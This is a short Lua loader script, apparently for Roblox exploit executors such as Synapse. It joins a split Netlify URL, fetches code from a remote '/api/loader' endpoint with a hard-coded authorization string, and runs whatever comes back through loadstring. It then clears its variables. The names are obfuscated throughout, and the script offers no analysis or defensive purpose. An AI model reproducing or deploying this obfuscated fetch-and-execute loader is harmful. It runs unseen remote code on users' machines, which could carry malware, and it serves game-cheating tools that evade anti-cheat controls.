local function v10293847561920384756()
    local p = { "https://", "shadowxprotection", ".netlify.app", "/api/loader" }
    local r = table.concat(p)
    p = nil
    return r
end

local v29384756102938475610 = (syn and syn.request) or (http and http.request) or (typeof(request) == "function" and request)

local v_authToken = '@#$_&-+()/*"' .. "':;!?_1029384756"

local function v84756102938475610293(url)
    assert(v29384756102938475610, "No request function available (use a supported executor)")
    local ok, res = pcall(v29384756102938475610, {
        Url     = url,
        Method  = "GET",
        Headers = {
            ["Authorization"] = v_authToken,
            ["Content-Type"]  = "application/json",
        },
    })

    if not ok then
        error("HTTP request failed: " .. tostring(res))
    end
    if not res or not res.Body or res.Body == "" then
        error("Empty response from loader endpoint (status: " .. tostring(res and res.StatusCode or "unknown") .. ")")
    end

    local trimmed = res.Body:match("^%s*(.-)%s*$")
    if trimmed:sub(1, 1) == "<" then
        error(
            "Loader returned an HTML page instead of Lua code.\n" ..
            "Fix: Check that NETLIFY_SUBDOMAIN is set correctly in localscript.lua\n" ..
            "and that your Netlify loader function is deployed.\n" ..
            "Response preview: " .. trimmed:sub(1, 120)
        )
    end

    return res.Body
end

local v_url  = v10293847561920384756()
local v_body = v84756102938475610293(v_url)
v_url        = nil

local v_fn, v_err = loadstring(v_body)
v_body = nil

if not v_fn then
    error(
        "Loader script failed to compile.\n" ..
        "This usually means the Netlify function returned something other than valid Lua.\n" ..
        "Compile error: " .. tostring(v_err)
    )
end

local v_ok, v_rerr = pcall(v_fn)
v_fn = nil
v_authToken = nil

if not v_ok then
    error("Loader runtime error: " .. tostring(v_rerr))
end
